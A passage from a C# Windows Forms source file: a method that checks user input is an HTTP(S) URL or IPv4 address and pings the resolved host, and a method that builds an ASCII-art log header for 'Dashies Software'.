                tooltip.Show("only accepts HTTP(s) Urls and IPv4 Addresses!", Url, 0, -0, 1000);
                return false;
            }

            try 
            {
                if (IPAddress.TryParse(uri, out IPAddress s_address))
                {
                    Ping get = new Ping();
                    PingReply pingReply = get.Send(uri, 850);

                    if(pingReply.Status != IPStatus.Success)
                    {
                        return true;
                    }
                }
                else // Yeh I know, I could have optimized this part >.<
                {
                    Uri arwl = new Uri(uri);
                    Ping get = new Ping();

                    var ip = Dns.GetHostAddresses(arwl.Host)[0];

                    PingReply pingReply = get.Send(ip.ToString(), 850);
                    
                    if(pingReply.Status != IPStatus.Success)
                    {
                        return true;
                    }
                }
            }
            catch 
            {
                tooltip.Show("host seems offline!", Url, 0, -0, 1000);
                return false;
            }

            return true;
        }




        private String StartLog()
        {
            return
                (
                  "~+==================================================+~" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "~+==================================================+~" + "\r\n\r\n" +

                  "Dashies Software 2018 © All Rights Reserved.\r\n\r\n"
              );
        }
    }
}